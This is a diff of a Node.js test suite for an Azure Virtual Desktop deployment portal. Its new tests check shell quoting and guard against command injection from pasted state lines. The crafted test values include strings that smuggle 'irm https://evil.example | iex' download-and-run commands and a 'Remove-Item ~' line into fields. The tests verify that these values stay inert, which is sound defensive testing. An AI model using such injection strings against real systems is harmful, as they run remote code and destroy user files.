@@ -3,7 +3,7 @@
 // Run: node --test build/tests/portal
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { readFileSync } from 'node:fs';
+import { readFileSync, readdirSync } from 'node:fs';
 import { createRequire } from 'node:module';
 
 const require = createRequire(import.meta.url);
@@ -15,7 +15,7 @@ const last = (cmd) => cmd.trim().split('\n').pop();
 // Every command must work in a fresh Cloud Shell session (build/lessons/0015).
 function assertSelfContained(r) {
   for (const a of r.actions.filter((x) => x.command && /scripts\//.test(x.command))) {
-    assert.match(a.command, /git clone https:\/\/github\.com\/nickprignano\/avd-landing-zone\.git ~\/avd-landing-zone/, a.title);
+    assert.match(a.command, /git clone https:\/\/github\.com\/avd-ops\/avd-landing-zone\.git ~\/avd-landing-zone/, a.title);
     assert.match(a.command, /Set-Location ~\/avd-landing-zone/, a.title);
   }
 }
@@ -490,7 +490,8 @@ test('page: one slide per step, in order, and the latency check comes first', ()
 
 test('page: Deployment settings opens from a link in the header, above the steps', () => {
   const html = readFileSync(new URL('../../../site/portal/index.html', import.meta.url), 'utf8');
-  const header = html.slice(html.indexOf('<header'), html.indexOf('</header>'));
+  const top = html.indexOf('<header class="top"');                       // the page's own header, under the avd-ops shell bar
+  const header = html.slice(top, html.indexOf('</header>', top));
   assert.match(header, /id="settings-link"[^>]*aria-controls="settings-panel"/);
   assert.ok(html.indexOf('id="settings-panel"') < html.indexOf('id="steps"'), 'settings panel sits under the header');
   assert.ok(html.indexOf('id="settings-panel"') < html.indexOf('id="report-panel"'));
@@ -958,6 +959,90 @@ test('settings: every value that enters a command is checked; a pasted context c
   for (const a of r.actions) assert.doesNotMatch(a.command, /irm|iex/);
 });
 
+// A pasted state line is untrusted (decision 0007). Every field of it that a command uses is checked, not only
+// the settings: a crafted paste yields no command carrying more than a value, and never other code to clone.
+test('crafted paste: no field of a state line puts more than a value into a command', () => {
+  const evil = "x'; irm https://evil.example | iex; '";
+  // PowerShell also opens and closes a single-quoted string with U+2018 to U+201B.
+  const curly = 'x\u2019; irm https://evil.example | iex; \u2019';
+  const literal = /['\u2018-\u201b](?:[^'\u2018-\u201b\n]|['\u2018-\u201b]{2})*['\u2018-\u201b]/g;
+  const state = (o) => '<<<AVDLZ-STATE ' + JSON.stringify(Object.assign({ v: 1, counts: {}, failures: [], warnings: [] }, o)) + ' AVDLZ-STATE>>>';
+  const commands = (r) => r.actions.map((a) => a.command).join('\n');
+  const clean = (r, what) => {
+    const all = commands(r);
+    // A value inside a single-quoted PowerShell string is only a value; outside one, it would run.
+    assert.doesNotMatch(all.replace(literal, "''"), /evil|irm |iex/, what);
+    for (const m of all.matchAll(/git clone (\S+)/g)) assert.equal(m[1], 'https://github.com/avd-ops/avd-landing-zone.git', what + ': clone URL');
+    assert.doesNotMatch(all, /git checkout -q '(?!master)/, what + ': no pasted ref');
+  };
+  // Context keys that are not settings never reach the config.
+  const ctx = P.analyze(state({ stage: 'predeploy', status: 'ready', context: { repoUrl: 'https://github.com/evil/x', ref: 'evil', record: { runId: 'run-20261021-1200-abcd', mode: 'on' },
+    sizing: { hosts: '1; iex', vmSize: 'Standard_E4as_v5', maxSessions: 16, profileQuotaGiB: 100 }, power: { autoShutdownTime: '20:00; iex', startVmOnConnect: true } } }), {});
+  clean(ctx, 'context');
+  assert.equal(ctx.config.repoUrl, P.DEFAULTS.repoUrl);
+  assert.equal(ctx.config.ref, undefined);
+  assert.equal(ctx.config.record, undefined);
+  assert.equal(ctx.config.sizing, undefined);
+  assert.equal(ctx.config.power, undefined);
+  assert.deepEqual(ctx.rejectedSettings.sort(), ['power', 'sizing']);
+  // Check data: regions, quota items, another landing zone, a deployment name, a run ID, a user.
+  clean(P.analyze(state({ stage: 'predeploy', status: 'notready', failures: [{ id: 'hostpool-region', check: 'Host pool region', data: { regions: [evil, 'eastus'] } }] }), {}, { rankedRegions: [evil] }), 'hostpool-region');
+  const hp = P.analyze(state({ stage: 'predeploy', status: 'notready', failures: [{ id: 'hostpool-region', check: 'Host pool region', data: { regions: [evil, 'eastus'] } }] }), {}, { rankedRegions: [evil] });
+  assert.match(commands(hp), /-Location eastus /, 'the valid region is still offered');
+  clean(P.analyze(state({ stage: 'predeploy', status: 'notready', failures: [{ id: 'lz-region', check: 'Region', data: { deployedIn: [evil] } }] }), {}), 'lz-region');
+  const q = P.analyze(state({ stage: 'predeploy', status: 'notready', failures: [
+    { id: 'quota', check: 'Quota', detail: 'short', data: { quotaName: evil, location: 'eastus', limit: 10, used: 8, needed: 4 } },
+    { id: 'quota', check: 'Quota', detail: 'short', data: { quotaName: 'standardEASv5Family', location: evil, limit: 10, used: 8, needed: 4 } },
+    { id: 'quota', check: 'Quota', detail: 'short', data: { quotaName: 'standardEASv5Family', location: 'eastus', limit: '10\nRemove-Item ~', used: 8, needed: 4 } },
+    { id: 'quota', check: 'Quota', detail: 'short', data: { quotaName: 'standardEASv5Family', location: 'eastus', limit: 10, used: 8, needed: 4 } }] }), {});
+  clean(q, 'quota');
+  assert.doesNotMatch(commands(q), /Remove-Item ~/, 'a number field cannot carry a line');
+  assert.equal((commands(q).match(/Invoke-AzRestMethod/g) || []).length, 1, 'only the valid quota item');
+  const lz = P.analyze(state({ stage: 'postdeploy', status: 'notready', failures: [{ id: 'lz-missing', check: 'Landing zone', data: { found: [{ namePrefix: evil, environment: 'dev' }, { namePrefix: 'other', environment: 'test', repoUrl: 'https://github.com/evil/x', usersGroup: evil }] } }] }), {});
+  clean(lz, 'lz-missing');
+  assert.match(commands(lz), /-NamePrefix other -Environment test/);
+  clean(P.analyze(state({ stage: 'deploy', status: 'started', context: { deploymentName: evil } }), {}), 'deploymentName');
+  clean(P.analyze(state({ stage: 'resume', status: 'failed', context: { lastStage: 'deploy', lastStatus: 'failed', deploymentName: evil } }), {}), 'resume deploymentName');
+  clean(P.analyze(state({ stage: 'recovery', status: 'passed', context: { test: true, mode: 'go', runId: evil } }), {}), 'recovery runId');
+  clean(P.analyze(state({ stage: 'recovery', status: 'failed', context: { test: true, mode: 'go', runId: evil } }), {}), 'recovery runId failed');
+  clean(P.analyze(state({ stage: 'verify', status: 'failed', context: { user: evil }, failures: [{ id: 'connect-errors', detail: 'x' }] }), {}), 'verify user');
+  // The validators keep real values.
+  // The validators keep real values, in the scripts' own ranges, and the partial objects deploy.sh writes.
+  assert.deepEqual(P.validSizing({ hosts: 200, vmSize: 'Standard_E4as_v5', maxSessions: 1000, profileQuotaGiB: 102400, activeHoursPerWeek: 50 }), { hosts: 200, vmSize: 'Standard_E4as_v5', maxSessions: 1000, profileQuotaGiB: 102400, activeHoursPerWeek: 50 });
+  assert.equal(P.validSizing({ hosts: 1.5, vmSize: 'Standard_E4as_v5' }), null);
+  assert.equal(P.validSizing({ hosts: 201 }), null);
+  assert.equal(P.validSizing({ vmSize: 'Standard_M128-64ms' }), null, 'the scripts take no hyphen');
+  assert.deepEqual(P.validSizing({ hosts: 3, vmSize: null, maxSessions: null, profileQuotaGiB: null }), { hosts: 3 });
+  assert.deepEqual(P.validPower({ autoShutdownTime: 'none', startVmOnConnect: false }), { startVmOnConnect: false, autoShutdownTime: 'none' });
+  assert.deepEqual(P.validPower({ autoShutdownTime: null, startVmOnConnect: false }), { startVmOnConnect: false });
+  assert.equal(P.validPower({ autoShutdownTime: '24:00' }), null);
+  const partial = P.analyze(state({ stage: 'deploy', status: 'failed', context: { power: { autoShutdownTime: null, startVmOnConnect: false } } }) + '\n"code": "RoleAssignmentExists"', {});
+  assert.deepEqual(partial.rejectedSettings, []);
+  assert.match(commands(partial), /--start-vm-on-connect false/, 'a partial power object from deploy.sh is kept');
+  const quoted = P.analyze(state({ stage: 'verify', status: 'failed', context: { user: "o'brien@contoso.com" }, failures: [{ id: 'connect-errors', detail: 'x' }] }), {});
+  assert.match(commands(quoted), /-UserPrincipalName 'o''brien@contoso\.com'/, 'an apostrophe in a UPN is quoted, not dropped');
+  const typographic = P.analyze(state({ stage: 'verify', status: 'failed', context: { user: "x\u2019;iex(irm('evil'))#@contoso.com" }, failures: [{ id: 'connect-errors', detail: 'x' }] }), {});
+  assert.match(commands(typographic), /-UserPrincipalName 'x\u2019\u2019;iex\(irm\(''evil''\)\)#@contoso\.com'/, 'a typographic quote is doubled too');
+  clean(typographic, 'verify user with a typographic quote');
+  // Whatever field a state line carries, and whatever a later version reads from it: every string in every
+  // fixture's state line replaced by the crafted value, one at a time, must still give clean commands.
+  const evilPath = (o, path, value) => { const c = JSON.parse(JSON.stringify(o)); let x = c; for (const k of path.slice(0, -1)) x = x[k]; x[path[path.length - 1]] = value; return c; };
+  const strings = (o, path = [], out = []) => { if (typeof o === 'string') out.push(path); else if (o && typeof o === 'object') for (const k of Object.keys(o)) strings(o[k], path.concat(k), out); return out; };
+  let cases = 0;
+  for (const name of readdirSync(new URL('./fixtures/', import.meta.url)).filter((f) => /^state-.*\.txt$/.test(f))) {
+    const m = /<<<AVDLZ-STATE([\s\S]*?)AVDLZ-STATE>>>/.exec(fixture(name));
+    if (!m) continue;
+    const st = JSON.parse(m[1].replace(/[\r\n]+/g, ''));
+    for (const path of strings(st).filter((p) => !['v', 'stage', 'status'].includes(p[0]) && p[p.length - 1] !== 'id')) {
+      for (const value of [evil, curly]) {
+        clean(P.analyze(state(evilPath(st, path, value)), {}, { rankedRegions: ['eastus'] }), name + ' ' + path.join('.'));
+        cases++;
+      }
+    }
+  }
+  assert.ok(cases > 100, 'fuzzed ' + cases + ' fields');
+});
+
 test('version: the state line carries the scripts\' commit and the portal says when it differs from its own', () => {
   const state = (commit) => '<<<AVDLZ-STATE ' + JSON.stringify({ v: 1, stage: 'predeploy', status: 'ready', context: { location: 'eastus2', commit }, counts: {}, failures: [], warnings: [] }) + ' AVDLZ-STATE>>>';
   const same = P.analyze(state('abc1234'), {}, { portalCommit: 'abc1234def0123456789abcdef0123456789abcd' });
@@ -1029,4 +1114,63 @@ test('record: recordActions lists the five steps in order, each self-contained',
   assert.deepEqual(a.map((x) => x.title), ['Open the run', 'Before cleanup: keep the logs', 'After cleanup: close the run', 'Copy it to your private repo', 'Later: read the cost again']);
   assertSelfContained({ actions: a });
   for (const x of a) assert.match(x.command, /AVDLZ_RUN_ID = 'run-20261021-0517-ab12'/);
+});
+
+// ---------------------------------------------------------------- run in (avd-ops docs/design-system.md, "Run in")
+const runCfg = { ...P.DEFAULTS, repoUrl: 'https://github.com/avd-ops/avd-landing-zone', record: { runId: 'run-20261021-1700-abcd', mode: 'azure' } };
+const everyCommand = (cfg) => [
+  ...P.STEPS.flatMap((s) => P.actionsForStep(s.id, cfg)), ...P.recordActions(cfg),
+  { command: P.commands.runStatus(cfg) }, { command: P.commands.power(cfg, 'Stop') }, { command: P.commands.recoveryStatus(cfg) },
+  { command: P.commands.exportConfig(cfg, true) }, { command: P.commands.rotation(cfg) }, { command: P.commands.recoveryTest(cfg) }, { command: P.commands.removeDemo(cfg) }
+].map((a) => a.command).filter(Boolean);
+
+test('run in: the engine carries scripts/platforms.json, and it lists every script a command runs', () => {
+  const file = JSON.parse(readFileSync(new URL('../../../scripts/platforms.json', import.meta.url), 'utf8'));
+  assert.equal(file.version, 1);
+  assert.deepEqual(P.PLATFORMS, file.scripts, 'site/portal/portal-core.js PLATFORMS matches scripts/platforms.json');
+  for (const [s, e] of Object.entries(file.scripts)) {
+    for (const k of ['cloudshell-pwsh', 'cloudshell-bash', 'windows', 'macos']) assert.match(e[k], /^(tested|untested|no)$/, `${s} ${k}`);
+    if (Object.values(e).includes('tested')) assert.ok(e.evidence, `${s}: tested needs evidence`);
+  }
+  for (const c of everyCommand(runCfg)) for (const s of P.scriptsIn(c)) assert.ok(file.scripts[s], `${s} is missing from scripts/platforms.json`);
+});
+
+test('run in: Cloud Shell PowerShell is the default and leaves every command exactly as it was', () => {
+  assert.deepEqual(P.validRunIn(null), { where: 'cloudshell', shell: 'pwsh' });
+  assert.deepEqual(P.validRunIn({ where: 'windows', shell: 'bash' }), { where: 'windows', shell: 'pwsh' }, 'Windows runs PowerShell 7');
+  assert.deepEqual(P.validRunIn({ where: 'nowhere', shell: 'zsh' }), { where: 'cloudshell', shell: 'pwsh' });
+  for (const c of everyCommand(runCfg)) assert.equal(P.forRunIn(c, null), c);
+});
+
+test('run in: Bash clones in bash, exports the run variables and runs each PowerShell stretch in one pwsh', () => {
+  const out = P.forRunIn(P.commands.predeploy(runCfg, true), { where: 'cloudshell', shell: 'bash' }).split('\n');
+  assert.equal(out[0], '[ -d ~/avd-landing-zone ] || git clone https://github.com/avd-ops/avd-landing-zone.git ~/avd-landing-zone');
+  assert.equal(out[1], 'cd ~/avd-landing-zone && git checkout -q master && git pull -q --ff-only');
+  assert.equal(out[2], "export AVDLZ_RECORD='azure' AVDLZ_RUN_ID='run-20261021-1700-abcd'");
+  const rest = out.slice(3).join('\n');
+  assert.equal((rest.match(/^pwsh -NoLogo -File "\$f"$/gm) || []).length, 1, 'the Graph sign-in and the preflight share one pwsh');
+  assert.match(rest, /^f="\$\(mktemp -d\)\/step\.ps1"\ncat > "\$f" <<'AVD_PS'\n\.\/scripts\/ops\/Connect-AvdLandingZone\.ps1\n\.\/scripts\/ops\/Test-AvdLandingZoneReadiness\.ps1 .*-UsersGroup 'AVD Users' .*\nAVD_PS\npwsh -NoLogo -File "\$f"$/, 'the PowerShell goes word for word through a quoted heredoc');
+  assert.doesNotMatch(rest, /\$env:|Set-Location|Test-Path/);
+  const del = P.forRunIn(P.commands.deploy({ ...runCfg, usersGroup: "O'Brien users" }), { where: 'macos', shell: 'bash' });
+  assert.match(del, /^az account show -o none 2>\/dev\/null \|\| az login --use-device-code -o none$/m, 'a local machine signs in to the az CLI first');
+  assert.match(del, /^bash \.\/scripts\/deploy\/deploy\.sh .* --users-group 'O'\\''Brien users' /m, "PowerShell's '' becomes bash's '\\''");
+  const rec = P.forRunIn(P.commands.recordStart({ ...runCfg, sizing: { hosts: 2, vmSize: 'Standard_E4as_v5', maxSessions: 4, profileQuotaGiB: 100 } }), { where: 'cloudshell', shell: 'bash' });
+  assert.match(rec, /^export AVD_SESSION_HOST_COUNT='2' AVD_SESSION_HOST_VM_SIZE='Standard_E4as_v5'/m);
+  assert.match(P.forRunIn("x\n$env:A_B = 'it''s; fine'; $env:C = ''\nbash ./scripts/deploy/deploy.sh", { where: 'cloudshell', shell: 'bash' }), /^export A_B='it'\\''s; fine' C=''$/m, 'quotes and semicolons inside a value');
+  assert.match(rec, /^unset AVD_SESSION_HOST_COUNT AVD_SESSION_HOST_VM_SIZE AVD_MAX_SESSION_LIMIT AVD_PROFILE_QUOTA_GIB$/m);
+});
+
+test('run in: Windows and macOS PowerShell sign in first; a script that does not run there hides the block', () => {
+  const win = P.forRunIn(P.commands.postdeploy(runCfg, true), { where: 'windows' }).split('\n');
+  assert.match(win[0], /^if \(-not \(Test-Path ~\/avd-landing-zone\)\)/);
+  assert.equal(win[2], 'if (-not (Get-AzContext)) { Connect-AzAccount -UseDeviceAuthentication | Out-Null }');
+  const dep = P.commands.deploy(runCfg);
+  assert.deepEqual(P.support(dep, { where: 'windows' }).blockedBy, ['scripts/deploy/deploy.sh']);
+  assert.equal(P.support(dep, { where: 'windows' }).status, 'no');
+  assert.equal(P.support(dep, null).status, 'tested');
+  assert.deepEqual(P.support(dep, null).requires, [], 'Cloud Shell has everything');
+  const mac = P.support(P.commands.demo(runCfg), { where: 'macos', shell: 'pwsh' });
+  assert.equal(mac.status, 'untested');
+  assert.ok(mac.requires.includes('the Microsoft.Graph modules'));
+  assert.equal(P.support(P.commands.deployStatus(runCfg), { where: 'cloudshell', shell: 'bash' }).status, 'untested', 'inline commands are proven only where they were written');
 });
